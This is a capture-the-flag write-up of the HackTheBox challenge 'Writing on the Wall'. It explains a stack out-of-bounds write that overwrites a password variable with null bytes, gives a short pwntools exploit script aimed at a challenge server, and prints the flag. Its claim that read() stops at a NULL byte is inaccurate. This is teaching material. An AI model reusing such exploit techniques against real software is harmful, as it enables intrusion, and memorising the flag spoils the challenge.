# Writing on the Wall
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d24cac08-522a-4ee3-8295-b10a354eb6eb)


## Lessons Learned:
1. Stack-Based Exploitation.
2. Out-of-Bound (OOB) Write.
3. read() vuln.
4. Local variable overwrite.

## DESCRIPTION:
<p align="justify">As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door's secrets?</p>

## STEPS:
1. In this challenge, we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3ee7ab91-a225-49b5-905c-4efbfa5c2190)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2178fd41-209e-4d55-b1af-c710fa829ec6)


2. Upon reviewing the decompiled code in ghidra, we can clearly spot the vuln at the read() usage. It introduced a OOB vuln.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cb41ecaf-6ff5-44d2-95a3-a917fc690d96)


3. It's quite straightforward then.
4. Reviewing the stack, seems the position of **password** is adjacent below **buffer**. Hence, hitting RBP shall overwrite **password**.
5. Remember about read() vuln, it reads data until it meet a NULL byte.
6. So then, utilizing the OOB could overwrite the **password** value entirely.
7. The flow is to pass 7 bytes of `\x00`, so this should happen:

```
buffer[6]
password = xxxxxxxxxx

read() --> we passed "\x00" * 7

# password is now overwritten
passowrd = 0000000
buffer = 0000000

strcmp(buffer,password) --> is comparing 0 and 0, shall resulting to true.
```

8. Great! here's the crafted exploit script.

> SCRIPT

```py
from pwn import *

exe = './writing_on_the_wall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

# sh = process(exe)
sh = remote('94.237.61.226', 48898)

sh.sendline(b'\x00' * 7)

sh.interactive()
```

> REMOTE TEST

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fe79492f-ec2c-48a2-aa1e-fd400e38fa01)


9. We've pwned it!

## FLAG

```
HTB{4n0th3r_br1ck_0n_th3_w4ll}
```
